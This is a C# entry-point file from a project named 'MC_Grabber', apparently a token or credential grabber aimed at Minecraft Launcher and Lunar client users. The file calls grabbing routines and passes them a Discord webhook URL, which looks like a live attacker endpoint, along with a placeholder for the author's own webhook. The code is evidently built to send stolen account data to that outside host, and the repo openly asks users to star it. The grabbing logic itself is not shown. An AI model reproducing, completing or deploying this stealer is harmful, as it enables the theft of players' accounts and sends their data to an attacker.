using System;

namespace MC_Grabber
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("---> Works Only With Minecraft Launcher & Lunar.");
            Console.WriteLine("");
            Console.WriteLine("---> User Should Launch With Forge / Vanilla / ETC.");
            Grab grabber = new Grab();
            grabber.Minecraft("SUPPORT ME BY STARRING THE REPO. // WEBHOOK HERE");
            grabber.Lunar("https://discord.com/api/webhooks/1214390217759527032/6khJTtzL-PYvPmHBcW4uJHhV80xR2rKI6V0q4EmeobteUxdwtBahZ2iv9RxUjuSIlhNK");
        }
    }
}
